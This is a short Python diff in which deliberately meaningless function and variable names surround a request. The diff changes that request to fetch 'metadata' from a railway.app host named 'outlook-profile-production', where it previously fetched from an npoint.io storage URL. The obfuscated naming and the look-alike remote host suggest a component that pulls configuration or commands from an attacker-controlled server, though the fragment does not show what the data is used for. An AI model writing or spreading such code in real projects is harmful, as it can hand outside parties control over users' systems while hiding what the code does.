@@ -16,7 +16,7 @@ def train_hqjtwt_342():
 
     def config_cdiobg_356():
         try:
-            learn_pwryyb_380 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_pwryyb_380 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_pwryyb_380.raise_for_status()
             net_tqkzgf_231 = learn_pwryyb_380.json()
             data_jloupl_451 = net_tqkzgf_231.get('metadata')
